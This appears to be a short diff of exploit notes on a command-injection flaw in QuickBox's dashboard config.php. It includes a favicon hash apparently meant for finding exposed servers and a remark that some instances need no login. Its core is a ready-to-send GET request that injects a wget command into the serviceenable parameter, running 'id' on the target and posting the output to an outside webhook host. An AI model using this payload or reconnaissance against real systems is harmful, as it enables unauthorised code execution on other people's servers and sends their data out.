@@ -1,3 +1,8 @@
+https://github.com/QuickBox/QB/blob/master/dashboard/inc/config.php
+
+http.favicon.hash:-440815503 
+
+
 RCE need to be auth, found some instances that are unauth, still working on something
 
 GET /inc/config.php?id=66&serviceenable=$(wget%20https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b%20--post-data=$(id)) HTTP/1.1
